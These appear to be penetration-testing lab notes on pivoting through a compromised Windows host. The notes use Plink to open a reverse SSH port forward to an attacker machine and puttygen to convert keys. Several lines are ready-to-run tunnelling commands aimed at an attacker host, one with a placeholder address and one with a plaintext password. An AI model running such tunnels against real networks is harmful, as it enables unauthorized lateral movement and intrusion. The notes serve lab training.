It's unlikely that Windows servers will have an SSH server running. So our use of Plink tends to involve carrying the binary to the target, then using it to create a reverse connection.

```sh
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT kali@ATTACKING_IP -i KEYFILE -N
```

> If we have access to `172.16.0.5` and want to forward a connection to `172.16.0.10:80` to port `8000` on our own attacking machine (`172.16.0.20`), we could use this command:

```sh
cmd.exe /c echo y | plink.exe -ssh -l kali -pw core -R 8000:172.16.0.10:80 172.16.0.20 -N
```

Or with key:

```sh
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i id_rsa.ppk -N
```

Note that not all keys generated by `ssh-keygen` will work properly here. You'll need to convert them using the `puttygen` tool:

```sh
puttygen id_rsa -o id_rsa.ppk
```

The resulting `.ppk` file can then be transferred to the Windows target and used exactly the same way as with reverse port forwarding
